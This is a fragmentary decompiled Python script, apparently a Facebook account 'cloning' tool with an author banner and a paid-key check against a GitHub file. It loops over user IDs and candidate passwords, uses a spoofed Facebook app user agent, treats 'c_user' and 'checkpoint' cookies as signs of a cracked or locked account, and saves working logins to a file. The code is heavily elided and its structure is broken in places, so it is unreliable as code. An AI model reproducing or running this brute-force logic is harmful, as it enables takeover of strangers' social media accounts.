# DECOMPILED BY EHSANULLA MOHAMMADI
...
'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄EHSAN𝙧᭄

'\x1b[1;91m'   Author      ||    EHSAN MOHAMMADI    

'\x1b[1;92m'   Github      ||     EHSAN  

'\x1b[1;93m'   FB ID       ||    EHSAN MOHAMMADI

'\x1b[1;94m'   TOOL TYPE   ||    FREE

'\x1b[1;96m'   WAP NUMBER  ||     0776484658            
...
def main_apv():
    ...
    try:
        ...
        key1=open("/sdcard/EHSAN.txt",'r').read()
        ...
        os.system("xdg-open https://wa.me/0776484658")

        

    r1=requests.get("https://raw.githubusercontent.com/EHSANXKhan/Paid/main/server.txt").text
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member In EHSAN Paid Commands ")
    ...
    elif  os. system("https://github.com/Ehsanulla13/Ehsan15.git")
...
def numcloning():
    ...
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄EHSAN𝙧᭄"| lolcat')
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print "\x1b[1;92m[EHSAN-OK] "+coc+user + " | " + pass1

                ok=open('EHSAN-ok.txt', 'a')
    ...
    print "\033[1;93m BAAKI NAAM TO SONA HOGAA [EHSAN])"
...
def xokpauto():
    ...
    os.system('cat Ehsan.txt | grep '+l1+' >> newlinks.txt')

    os.system('cat Ehsan.txt | grep '+l2+' >> newlinks.txt')
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print "\x1b[1;92m[EHSAN-OK] "+uid + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print "\x1b[1;92m[EHSAN-OK] "+uid + " | " + pass2
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print "\x1b[1;92m[EHSAN-OK] "+uid + " | " + pass3
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    ...
                                    print "\x1b[1;91m[EHSAN-CP] "+uid + " | " + pass3
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        print "\x1b[1;92m[EHSAN-OK] "+uid + " | " + pass4
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            print "\x1b[1;91m[EHSAN-CP] "+uid + " | " + pass4
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                print "\x1b[1;92m[EHSAN-OK] "+uid + " | " + pass5
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    print "\x1b[1;91m[EHSAN-CP] "+uid + " | " + pass5
    ...
    print "\033[1;93m NAAM TO SONA HOGAA [EHSAN])"
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            print "\x1b[1;91m[EHSAN-CP] "+uid + " | " + pass2
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    ...
                                    print "\x1b[1;91m[EHSAN-OK] "+uid + " | " + pass3
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    print "\x1b[1;97m[EHSAN-CP] "+uid + " | " + pass5
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    ...
                    print "\x1b[1;91m[EHSAN-OK] "+uid + " | " + pass1
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    ...
                    if "access_token" in q:
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            ...
                            print "\x1b[1;91m[EHSAN-OK] "+uid + " | " + pass2
